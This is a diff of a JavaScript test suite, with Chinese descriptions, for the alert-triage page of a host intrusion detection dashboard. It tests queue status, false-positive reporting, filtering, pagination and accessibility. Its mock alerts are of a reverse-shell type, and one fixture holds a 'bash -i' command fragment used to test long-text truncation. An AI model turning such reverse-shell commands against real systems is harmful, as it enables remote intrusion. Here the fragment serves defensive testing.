-  assert.ok(missing.querySelector('b'), '稿的 .missing 里 b 单独上警示色（alerts.html:645）');
-});
-
-test('抽屉「缺失证据」：未研判与空数组都 hidden（不画空行）', async () => {
-  const { host } = mount();
-  await flush();
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
-  assert.equal(host.querySelector('[data-role="drawer-missing"]').hidden, true);
-  assert.equal(text(host.querySelector('[data-role="drawer-missing"]')), '');
-});
-
-test('抽屉「缺失证据」：done 但数组为空时 hidden', async () => {
-  const { host } = mount({
-    alertsBody: {
-      alerts: [alert({ triage: { status: 'done', verdict_label: '误报', missing_evidence: [] } })],
-      total: 1,
-    },
-  });
-  await flush();
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
-  assert.equal(host.querySelector('[data-role="drawer-missing"]').hidden, true);
-});
-
-test('抽屉底部按钮：未研判→加入队列（POST），失败→重试，完成→重新研判', async () => {
-  const { host, calls } = mount({
-    handler: (url, init) => (url.startsWith('/api/agent/triage/') && init?.method === 'POST'
-      ? respond({ alert_id: 'revshell:1', status: 'queued', stage: '等待研判' }, 202)
-      : null),
-  });
-  await flush();
-
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
-  const button = host.querySelector('[data-role="drawer-queue"]');
-  assert.equal(text(button), '加入研判队列');
-  assert.equal(button.disabled, false);
-
-  button.dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.ok(calls.some(call => call.init?.method === 'POST' && call.url === '/api/agent/triage/revshell%3A1'));
-  assert.equal(text(button), '排队中');
-  assert.equal(button.disabled, true);
-});
-
-// ---------- 队列条 ----------
-
-test('队列条：计数与输入模式来自 /api/agent/triage/status；点开关 PUT control 并换文案', async () => {
-  const { host, calls } = mount({
-    handler: (url, init) => (url === '/api/agent/triage/control' && init?.method === 'PUT'
-      ? respond({ ...SUMMARY, enabled: false })
-      : null),
-  });
-  await flush();
-
-  assert.equal(text(host.querySelector('[data-role="qmode"]')), 'Syslog 推入');
-  assert.equal(text(host.querySelector('[data-role="qc-queued"]')), '2');
-  assert.equal(text(host.querySelector('[data-role="qc-running"]')), '1');
+  // 队列条照接口
+  assert.equal(text(host.querySelector('[data-role="qstate-text"]')), '运行中');
   assert.equal(text(host.querySelector('[data-role="qc-done"]')), '9');
-  assert.equal(text(host.querySelector('[data-role="qc-failed"]')), '1');
 
-  buttonByName(host, '暂停').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-
-  const put = calls.find(call => call.init?.method === 'PUT');
-  assert.equal(put.url, '/api/agent/triage/control');
-  assert.deepEqual(JSON.parse(put.init.body), { enabled: false });
-  assert.equal(text(host.querySelector('[data-role="qstate"]')), '自动研判 已暂停');
-  assert.ok(buttonByName(host, '恢复'));
+  // A4：主列表不碰牧云现查
+  assert.equal(calls.some(call => call.url.startsWith('/api/alerts')), false);
+  assert.equal(calls.some(call => call.url.includes('/false-positive')), false);
 });
 
-test('队列条：状态接口挂了只降级这一条，列表照常显示，不拿 0 充数', async () => {
-  const { host } = mount({ summaryStatus: 503 });
+test('格 1「加载」：首屏骨架 + aria-busy + 刷新/筛选禁用 + 读屏说明', async () => {
+  let release;
+  const gate = new Promise(resolve => { release = resolve; });
+  const host = mountAlertsPage({
+    fetchImpl: async () => { await gate; return respond({ total: 0, cases: [] }); },
+    now: () => new Date('2026-11-18T12:00:00.000Z'),
+  });
+  document.body.append(host);
   await flush();
-
-  assert.equal(rows(host).length, 1, '列表不受影响');
-  assert.equal(text(host.querySelector('[data-role="qstate"]')), '自动研判 状态不可用');
-  assert.equal(text(host.querySelector('[data-role="qc-queued"]')), '—');
-  assert.equal(host.querySelector('[data-role="queue-toggle"]').hidden, true);
-  const note = host.querySelector('[data-role="qerror"]');
-  assert.equal(note.hidden, false);
-  assert.match(text(note), /队列状态读取失败/);
+  assert.equal(text(host.querySelector('[data-role="rows"]')), '正在读取研判记录…');
+  assert.equal(host.querySelector('[data-role="table-wrap"]').getAttribute('aria-busy'), 'true');
+  assert.equal(host.querySelector('[data-role="refresh"]').disabled, true);
+  assert.equal(host.querySelector('[data-role="filter-verdict"]').disabled, true);
+  release();
+  await flush();
 });
 
-// ---------- 复制与纯函数 ----------
+test('格 2「空」：没有记录与筛选无匹配两套空态；清除筛选回第一页重取', async () => {
+  const { host, calls } = mount({ casesBody: { total: 0, cases: [] } });
+  await flush();
+  assert.equal(text(host.querySelector('[data-role="rows"]')), '暂无研判记录。');
 
-test('复制告警 ID：环境不支持剪贴板时降级为提示，不抛异常', async () => {
+  const second = mount({ casesBody: { total: 0, cases: [] } });
+  await flush();
+  const verdictSelect = second.host.querySelector('[data-role="filter-verdict"]');
+  verdictSelect.value = 'threat';
+  verdictSelect.dispatchEvent(new second.host.ownerDocument.defaultView.Event('change'));
+  await flush();
+  assert.equal(text(second.host.querySelector('[data-role="rows"]')), '没有匹配的研判记录。清除筛选');
+  second.host.querySelector('[data-role="rows"] button').click();
+  await flush();
+  const last = caseCalls(second.calls).at(-1).url;
+  assert.match(last, /offset=0/);
+  assert.doesNotMatch(last, /verdict=/);
+});
+
+test('格 3「部分失败」：队列状态读不到 → 队列条说实话，列表照常（A4）', async () => {
+  const { host } = mount({ summaryStatus: 503, summary: { error: '自动研判尚未配置' } });
+  await flush();
+  assert.equal(text(host.querySelector('[data-role="qstate-text"]')), '状态不可用');
+  assert.equal(text(host.querySelector('[data-role="qmode"]')), '—');
+  assert.equal(host.querySelector('[data-role="qerror"]').hidden, false);
+  assert.match(text(host.querySelector('[data-role="qerror"]')), /队列状态读取失败/);
+  // 列表不受影响
+  assert.equal(rows(host).length, 1);
+  assert.equal(text(rows(host)[0].querySelector('.col-verdict')), '真实威胁');
+});
+
+test('格 4「错误」：列表 503 → 整页错误块与重试；重试成功后恢复', async () => {
+  let fail = true;
+  const { host } = mount({
+    handler: async url => (fail && url.startsWith('/api/agent/triage/cases')
+      ? respond({ error: '自动研判尚未配置' }, 503) : null),
+  });
+  await flush();
+  const alert = host.querySelector('[data-role="rows"] [role="alert"]');
+  assert.ok(alert);
+  assert.match(text(alert), /自动研判未配置/);
+  assert.match(text(alert), /服务端没有启用自动研判/);
+
+  fail = false;
+  [...alert.querySelectorAll('button')].find(button => text(button) === '重试').click();
+  await flush();
+  assert.equal(rows(host).length, 1);
+  assert.equal(host.querySelector('[data-role="rows"] [role="alert"]'), null);
+});
+
+test('格 5「超长内容」：主机/命令/规则 id 全文进 DOM 与 title，视觉截断靠 CSS', async () => {
+  const longHost = 'fe80::a1b2:c3d4:e5f6:7788%eth0-with-a-very-long-zone-name';
+  const longRule = 'ssh_bruteforce_with_a_very_long_rule_identifier_for_testing_truncation';
+  const { host } = mount({
+    casesBody: { total: 1, cases: [record({ host_ip: longHost, rule_id: longRule, command: `bash -i ${'x'.repeat(200)}` })] },
+  });
+  await flush();
+  const ip = host.querySelector('.col-ip .cell-ip');
+  assert.equal(ip.textContent, longHost);
+  assert.match(ip.getAttribute('title'), /来源 45\.9\.1\.2/);
+  assert.match(ip.getAttribute('title'), /命令 bash -i x{10}/);
+  const rule = host.querySelector('.col-rule .rule-id');
+  assert.equal(rule.textContent, longRule);
+  assert.equal(rule.getAttribute('title'), longRule);
+});
+
+test('格 6「禁用」：未完成与已误报的行不能登记误报，按钮说清原因', async () => {
+  const { host } = mount({
+    casesBody: {
+      total: 3,
+      cases: [
+        record({ alert_id: 'syslog:a:0123456789abcdef:1:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', status: 'running', verdict: null, verdict_label: null }),
+        record({ alert_id: 'syslog:b:0123456789abcdef:2:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', verdict: 'false_positive', verdict_label: '误报', maintenance: { status: 'updating', rule: { status: 'updating' }, wiki: { status: 'updating' } } }),
+        record({ alert_id: 'syslog:c:0123456789abcdef:3:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee' }),
+      ],
+    },
+  });
+  await flush();
+  const buttons = [...host.querySelectorAll('.col-ops button')];
+  assert.equal(buttons[0].disabled, true);
+  assert.match(buttons[0].title, /研判还没结束/);
+  assert.equal(text(buttons[1]), '已误报');
+  assert.equal(buttons[1].disabled, true);
+  assert.equal(buttons[2].disabled, false);
+  assert.equal(text(buttons[2]), '标为误报');
+});
+
+test('A2 误报：点开理由表单 → 提交 → 这一行立刻变误报，理由与维护状态都留在页面上', async () => {
+  const { host, calls } = mount({
+    handler: async (url, init) => {
+      if (url.endsWith('/false-positive') && init?.method === 'POST') {
+        return respond({
+          alert_id: record().alert_id,
+          verdict: { verdict: 'false_positive', verdict_label: '误报', source: 'human' },
+          feedback: { reason: '内网扫描器固定脚本，已确认非攻击', who: 'hids', recorded_at: '2026-11-18T11:00:00.000Z' },
+          maintenance: { status: 'updating', rule: { status: 'updating' }, wiki: { status: 'updating' } },
+        }, 202);
+      }
+      return null;
+    },
+  });
+  await flush();
+
+  const button = host.querySelector('.col-ops button');
+  button.click();
+  await flush();
+
+  const form = host.querySelector('.fp-row form');
+  assert.ok(form, '行下应展开误报理由表单');
+  const textarea = form.querySelector('textarea');
+  assert.equal(document.activeElement, textarea, '打开表单应聚焦理由输入');
+
+  // 太短：拦住，不发请求
+  textarea.value = '误报';
+  form.querySelector('.btn-primary').click();
+  await flush();
+  assert.match(text(form.querySelector('.fp-hint')), /理由要 10 到 4000 字/);
+  assert.equal(calls.some(call => call.url.endsWith('/false-positive')), false);
+
+  // 合格：POST 正文只有理由（who 由服务端取账号），回来立刻改行
+  textarea.value = '内网扫描器固定脚本，已确认非攻击';
+  form.querySelector('.btn-primary').click();
+  await flush();
+
+  const post = calls.find(call => call.url.endsWith('/false-positive'));
+  assert.equal(post.init.method, 'POST');
+  assert.deepEqual(JSON.parse(post.init.body), { reason: '内网扫描器固定脚本，已确认非攻击' });
+  assert.match(decodeURIComponent(post.url), /\/api\/agent\/triage\/syslog:revshell:.*\/false-positive/);
+
+  assert.equal(text(rows(host)[0].querySelector('.col-verdict')), '误报');
+  assert.equal(text(rows(host)[0].querySelector('.col-maint')), '规则 更新中 · 知识库 更新中');
+  assert.equal(host.querySelector('.fp-row'), null, '提交成功后表单收起');
+  assert.equal(text(rows(host)[0].querySelector('.col-ops button')), '已误报');
+  assert.match(text(host.querySelector('[data-role="sr-status"]')), /标成误报/);
+});
+
+test('A2 误报 409：研判还没结束时如实报错，行不变', async () => {
+  const { host } = mount({
+    handler: async url => (url.endsWith('/false-positive')
+      ? respond({ error: '研判还没结束，不能登记误报' }, 409) : null),
+  });
+  await flush();
+  host.querySelector('.col-ops button').click();
+  await flush();
+  const form = host.querySelector('.fp-row form');
+  form.querySelector('textarea').value = '这条断言需要至少十个字';
+  form.querySelector('.btn-primary').click();
+  await flush();
+  assert.match(text(form.querySelector('.fp-hint')), /研判还没结束/);
+  assert.equal(text(rows(host)[0].querySelector('.col-verdict')), '真实威胁');
+});
+
+test('筛选与排序全部下推给接口（结论/类型/主机/时间/sort）', async () => {
+  const { host, calls } = mount();
+  await flush();
+  const change = node => node.dispatchEvent(new host.ownerDocument.defaultView.Event('change'));
+
+  const verdict = host.querySelector('[data-role="filter-verdict"]');
+  verdict.value = 'threat';
+  change(verdict);
+  await flush();
+  assert.match(caseCalls(calls).at(-1).url, /verdict=threat/);
+
+  const type = host.querySelector('[data-role="filter-type"]');
+  type.value = 'honeypot';
+  change(type);
+  await flush();
+  assert.match(caseCalls(calls).at(-1).url, /type=honeypot/);
+
+  const hostInput = host.querySelector('[data-role="filter-host"]');
+  hostInput.value = ' 10.0.0.5 ';
+  change(hostInput);
+  await flush();
+  assert.match(caseCalls(calls).at(-1).url, /host=10\.0\.0\.5/);
+
+  const time = host.querySelector('[data-role="filter-time"]');
+  time.value = '24h';
+  change(time);
+  await flush();
+  assert.match(caseCalls(calls).at(-1).url, /from=/);
+
+  host.querySelector('[data-role="sort-verdict"]').click();
+  await flush();
+  const last = caseCalls(calls).at(-1).url;
+  assert.match(last, /sort=verdict/);
+  assert.equal(host.querySelector('[data-role="th-verdict"]').getAttribute('aria-sort'), 'descending');
+  assert.equal(host.querySelector('[data-role="filter-count"]').textContent, '筛选后 1 条');
+});
+
+test('表格包裹层：类名与样式表对得上，横向滚动落在包裹层上（页面本身不横滚）', async () => {
   const { host } = mount();
   await flush();
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
+  const wrap = host.querySelector('[data-role="table-wrap"]');
+  assert.ok(wrap.classList.contains('table-wrap'), `包裹层类名应为 table-wrap，实际 ${wrap.className}`);
+  assert.ok(wrap.querySelector('table.alerts'), '表格要住在包裹层里');
+  // jsdom 不算布局：直接读样式文件，把「DOM 类名 ↔ CSS overflow-x」钉在一起（同 knowledge.test.js 的先例）
+  const css = readFileSync(new URL('../../assets/pages/alerts.css', import.meta.url), 'utf8');
+  assert.match(css, /\.table-wrap\s*\{[^}]*overflow-x:\s*auto/);
+});
 
-  host.querySelector('[data-role="copy-id"]').dispatchEvent(new dom.window.Event('click'));
+test('主机筛选：逐键输入各发一轮，回车不再发第二遍（复审 findings 2）', async () => {
+  const { host, calls } = mount();
   await flush();
-  assert.match(text(host.querySelector('[data-role="sr-status"]')), /复制失败，请手动选择 revshell:1/);
+  const input = host.querySelector('[data-role="filter-host"]');
+  const fire = type => input.dispatchEvent(new host.ownerDocument.defaultView.Event(type, { bubbles: true }));
+  const before = caseCalls(calls).length;
+
+  input.value = '10.';
+  fire('input');
+  await flush();
+  input.value = '10.0.0.5';
+  fire('input');
+  await flush();
+  const afterTyping = caseCalls(calls).length;
+  assert.equal(afterTyping - before, 2, '每一键一轮取数');
+  assert.match(caseCalls(calls).at(-2).url, /host=10\./);
+  assert.match(caseCalls(calls).at(-1).url, /host=10\.0\.0\.5/);
+
+  // 回车：type=search 的浏览器会连发 search + change——值没变，一条都不发
+  fire('search');
+  fire('change');
+  await flush();
+  assert.equal(caseCalls(calls).length, afterTyping, '一次回车不能再发一轮相同请求');
+
+  // 值真变了（比如粘贴后失焦）→ change 兜底仍要取一轮
+  input.value = ' 10.0.0.6 ';
+  fire('change');
+  await flush();
+  assert.equal(caseCalls(calls).length, afterTyping + 1);
+  assert.match(caseCalls(calls).at(-1).url, /host=10\.0\.0\.6/);
 });
 
-test('formatTime：ISO 转本地 YYYY-MM-DD HH:MM:SS；空值/非法值给「—」', () => {
-  assert.match(formatTime('2026-11-17T01:02:03.000Z'), /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);
-  assert.equal(formatTime(null), '—');
-  assert.equal(formatTime(''), '—');
-  assert.equal(formatTime('不是时间'), '—');
+test('主机逐键取数时不清表、不禁用输入框（否则打到一半输入框失焦）', async () => {
+  let hold = false;
+  let release;
+  const gate = new Promise(resolve => { release = resolve; });
+  const { host } = mount({
+    handler: async url => {
+      if (!hold || !String(url).startsWith('/api/agent/triage/cases')) return null;
+      await gate;
+      return respond({ total: 1, cases: [record({ host_ip: '10.0.0.9' })] });
+    },
+  });
+  await flush();
+  hold = true;
+  const input = host.querySelector('[data-role="filter-host"]');
+  input.value = '10.0.0.9';
+  input.dispatchEvent(new host.ownerDocument.defaultView.Event('input', { bubbles: true }));
+  await flush();
+
+  assert.equal(input.disabled, false, '取数中主机输入框必须还能继续输入');
+  assert.equal(rows(host).length, 1, '取数中保留上一轮的行，不闪骨架');
+  assert.equal(host.querySelector('[data-role="table-wrap"]').hasAttribute('aria-busy'), false);
+  release();
+  await flush();
+  assert.equal(text(rows(host)[0].querySelector('.col-ip')), '10.0.0.9');
 });
 
-test('triageStatusOf / verdictOf：只认接口的枚举，别的一律回落', () => {
-  assert.equal(triageStatusOf({ triage: null }), 'not_queued');
-  assert.equal(triageStatusOf({ triage: { status: 'queued' } }), 'queued');
-  assert.equal(triageStatusOf({ triage: { status: '乱写' } }), 'not_queued');
+test('主机逐键取数：先发的旧响应晚到也不许盖掉新结果', async () => {
+  const pending = [];
+  const custom = host => ({ total: 1, cases: [record({ host_ip: host })] });
+  const { host: page } = mount({
+    handler: url => {
+      const u = String(url);
+      if (!u.startsWith('/api/agent/triage/cases')) return null;
+      const value = new URL(u, 'http://stub').searchParams.get('host');
+      if (!value) return null;
+      return new Promise(resolve => {
+        pending.push({ value, done: () => resolve(respond(custom(value))) });
+      });
+    },
+  });
+  await flush();
+  const input = page.querySelector('[data-role="filter-host"]');
+  const fire = () => input.dispatchEvent(new page.ownerDocument.defaultView.Event('input', { bubbles: true }));
 
-  assert.equal(verdictOf({ triage: { verdict_label: '真实威胁' } }), '真实威胁');
-  assert.equal(verdictOf({ triage: { verdict_label: null } }), null);
-  assert.equal(verdictOf({ triage: null, verdict: '待研判' }), null, 'alert.verdict 是占位值，不当结论');
+  input.value = '10.0.0.5';
+  fire();
+  await flush();
+  input.value = '10.0.0.6';
+  fire();
+  await flush();
+  assert.deepEqual(pending.map(item => item.value), ['10.0.0.5', '10.0.0.6']);
+
+  pending[1].done();
+  await flush();
+  assert.equal(text(rows(page)[0].querySelector('.col-ip')), '10.0.0.6');
+  pending[0].done();
+  await flush();
+  assert.equal(text(rows(page)[0].querySelector('.col-ip')), '10.0.0.6', '旧响应晚到不许把表格盖回去');
+});
+
+test('分页与每页条数：offset 跟着页码走，每页 50 回第一页', async () => {
+  const { host, calls } = mount({ casesBody: { total: 120, cases: [record()] } });
+  await flush();
+  host.querySelector('[data-role="next-page"]').click();
+  await flush();
+  assert.match(caseCalls(calls).at(-1).url, /offset=20/);
+  host.querySelector('[data-role="size-50"]').click();
+  await flush();
+  const last = caseCalls(calls).at(-1).url;
+  assert.match(last, /count=50/);
+  assert.match(last, /offset=0/);
+});
+
+test('每行都能进详情与深度溯源：链接带编码后的案件 ID', async () => {
+  const { host } = mount({ casesBody: { total: 1, cases: [record({ alert_id: 'syslog:revshell:0123456789abcdef:1:uuid-1' })] } });
+  await flush();
+  const links = [...host.querySelectorAll('.col-ops a')].map(a => a.getAttribute('href'));
+  const id = encodeURIComponent('syslog:revshell:0123456789abcdef:1:uuid-1');
+  assert.deepEqual(links, [`#/alert-detail/${id}`, `#/trace/${id}`]);
+});
+
+test('可访问性：表格有 caption 与 th scope，队列条是带名字的 group，读屏有 aria-live', async () => {
+  const { host } = mount();
+  await flush();
+  assert.ok(host.querySelector('table caption'));
+  assert.ok([...host.querySelectorAll('th')].every(th => th.getAttribute('scope') === 'col'));
+  assert.equal(host.querySelector('[data-role="queue"]').getAttribute('aria-label'), '自动研判队列');
+  assert.equal(host.querySelector('[data-role="sr-status"]').getAttribute('aria-live'), 'polite');
+  assert.ok(host.querySelector('[data-role="filter-host"]').getAttribute('aria-label'));
+});
+
+test('纯函数：事件时间、类型名、重复次数、维护文案都不编数据', () => {
+  assert.equal(formatEventTime(1732000000), formatEventTime(new Date(1732000000 * 1000).toISOString()));
+  assert.equal(formatEventTime('不是时间'), '—');
+  assert.equal(formatEventTime(null), '—');
+  assert.equal(typeLabelOf({ msgid: 'cloudwalker-revshell' }), '反弹 Shell');
+  assert.equal(typeLabelOf({ msgid: 'unknown-msgid' }), 'unknown-msgid');
+  assert.equal(typeLabelOf({}), '—');
+  assert.equal(repeatOf({ repeat_count: 4 }), 4);
+  assert.equal(repeatOf({}), 1);
+  assert.equal(verdictOf({ verdict_label: '存疑' }), '存疑');
+  assert.equal(verdictOf({}), null);
+  assert.equal(maintenanceText({ maintenance: { status: 'failed', rule: { status: 'updated' }, wiki: { status: 'failed' } } }),
+    '规则 已更新 · 知识库 失败');
+  assert.equal(maintenanceText({}), '—');
 });
